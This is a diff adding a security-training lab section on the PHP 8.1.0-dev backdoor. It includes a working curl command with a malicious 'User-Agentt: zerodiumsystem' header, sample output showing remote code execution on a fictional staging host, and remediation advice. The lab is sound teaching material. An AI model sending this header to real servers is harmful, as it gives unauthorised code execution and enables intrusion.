@@ -51,6 +51,103 @@ within this PHP version! If our system runs this version, that is a potentially 
 
 In the next exercise, let’s exploit this finding and validate the issue again using CURL.
 
+* Output
+--------
+
+Terminal
+
+$ curl -verbose http://staging-dev.acmeco.org/welcome.php
+*   Trying 10.100.80.90:80...
+* Connected to staging-dev.acmeco.org (10.100.80.90) port 80 (#0)
+> GET /welcome.php HTTP/1.1
+> Host: staging-dev.acmeco.org
+> User-Agent: curl/7.82.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 301 Moved Permanently
+< Server: Apache/2.4.55
+< X-Powered-By: PHP/8.1.0-dev
+< Date: Mon, 20 Feb 2023 15:36:37 GMT
+< Content-Type: text/html
+< Content-Length: 161
+< Connection: keep-alive
+< Location: https://staging-dev.acmeco.org/welcome.php
+< 
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body>
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>Acme</center>
+</body>
+</html>
+* Connection #0 to host staging-dev.acmeco.org left intact
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+* Exploiting and Remediating Vulnerable and Outdated Components
+---------------------------------------------------------------
+Let’s validate the PHP version we observed. While the returned version number does have known issues, we need to ensure the system we’re testing is vulnerable and not returning a wrong 
+version.
+
+If we research this version of PHP, we should be able to identify several write up about php/8.1-backdoor and php-8.1.0-dev-backdoor-rce.
+
+Reading through these vulnerabilities, we see that the backdoor is triggered by a special HTTP header called User-Agentt. The value associated with this header is ultimately passed to an 
+eval statement, capable of executing arbitrary code.
+
+* Instructions 
+--------------
+To validate this finding, we’ll use CURL once again. This time, however, we’ll also include the --headers argument to add the malicious header.
+
+Run the following command.
+
+	curl -verbose http://staging-dev.acmeco.org/ --header "User-Agentt: zerodiumsystem('id')"
+
+If we look at the response body, we’ll see the output of the id command. This means the system is vulnerable and susceptible to remote code execution!
+
+Now that we’ve validated the finding let’s discuss potential fixes.
+
+When addressing Vulnerable and Outdated Components, several approaches can help to mitigate and reduce the risk associated with problematic components.
+
+The first and usual solution is to update the problematic component to a secure, non-vulnerable version. In our case, this is likely the only solution we can effectively implement. Because 
+the backdoor is built directly into the version of PHP, we cannot leverage this version of PHP without exposing the vulnerability.
+
+In some cases, we may be able to avoid updating components and instead avoid using vulnerable functions. For example, many sites use JQuery, and given the code size and the number of 
+open-source developers contributing to the code, vulnerabilities have crept in.
+
+While various issues impact certain versions of JQuery, many of these vulnerabilities are tied to specific JQuery functions. If we avoid these functions, we can avoid making our code 
+vulnerable.
+
+Of course, leaving vulnerable components may create issues down the road, though software requirements may change, and developers may unintentionally implement dangerous portions of these 
+components.
+
+In the case of Acme Org’s site, we would likely recommend that the development team update their version of PHP to a secure version.
+
+* output
+--------
+
+Terminal
+
+$ curl -verbose http://staging-dev.acmeco.org/ --header "User-Agentt: zerodiumsystem('id')"
+*   Trying 10.100.80.90:80...
+* Connected to staging-dev.acmeco.org (10.100.80.90) port 80 (#0)
+> GET / HTTP/1.1
+> Host: staging-dev.acmeco.org
+> User-Agent: curl/7.82.0
+> User-Agentt: zerodiumsystem('id')
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: Apache/2.4.55
+< X-Powered-By: PHP/8.1.0-dev
+< Date: Mon, 20 Feb 2023 15:36:37 GMT
+< Content-Type: text/html
+< 
+<!DOCTYPE html>
+uid=1000(staging) gid=1000(staging) groups=1000(staging)
+* Connection #0 to host staging-dev.acmeco.org left intact
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
